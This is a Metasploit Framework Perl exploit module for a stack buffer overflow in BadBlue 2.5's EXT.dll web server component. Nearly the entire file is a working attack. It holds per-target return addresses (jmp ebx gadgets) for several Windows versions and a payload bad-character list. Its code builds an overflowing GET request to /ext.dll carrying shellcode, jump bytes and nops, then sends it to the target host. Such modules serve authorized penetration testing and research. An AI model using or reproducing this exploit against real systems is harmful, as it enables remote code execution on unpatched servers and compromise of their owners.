##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::badblue_ext_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;
my $advanced = { };

my $info =
  {
	'Name'  => 'BadBlue 2.5 EXT.dll Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => [ 'acaro <acaro [at] jervus.it>', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'     => 410,
		'MinNops'   => 10,
		'BadChars'  => "\x00\x0a\x0d\x20\x26\x2b\x26\x3d\x25\x8c\x3c",
		'Keys'      => ['+ws2ord'],
	  },
	  

	'Description'  => Pex::Text::Freeform(qq{
		This is a stack overflow exploit for BadBlue version 2.5.
	Tested only the Italian language version of Windows 2000 SP0 and SP4.
	Based on the exploit by Hat-Squad.
}),

	'Refs'  =>
	  [
		['OSVDB', 14238],
		['BID',   7387], 
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
	    ['Bad Blue 2.5 (Universal)', 75, 0x10027728],# jmp ebx in ext.dll
		['Windows 2000 SP0-SP3 English', 75, 0x6c4292ab],# jmp ebx in mfc42.dll
		['Windows 2000 SP4 English', 75, 0x6c4302d3],# jmp ebx in mfc42.dll
		['Windows XP SP0-SP1 English', 75, 0x7762c383],# jmp ebx in shell32.dll
		['Windows XP SP2 English', 75, 0x73e7dcfd],# jmp ebx in mfc42.dll
		['Windows 2003 Server SP0-SP1 English', 75, 0x77d7eaf0],# jmp ebx in user32.dll
	  ],

	'Keys' => ['badblue'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $pattern = "GET /ext.dll?mfcisapicommand=";
	
	$pattern .= $shellcode;
	$pattern .= Pex::Text::AlphaNumText($target->[1]);
	$pattern .= "\xEB\x0C\x90\x90";
	$pattern .= pack('V', $target->[2]);
	$pattern .= $self->MakeNops(8);
	$pattern .= "\xE9\x0B\xFE\xFF\xFF";
	$pattern .= $self->MakeNops(8);
	my $request = $pattern . "\x0D\x0A\x0D\x0A";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using jmp ebx at 0x%.8x...", $target->[2]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);
	$s->Recv(-1, 10);
	$s->Close();
	return;
}

1;
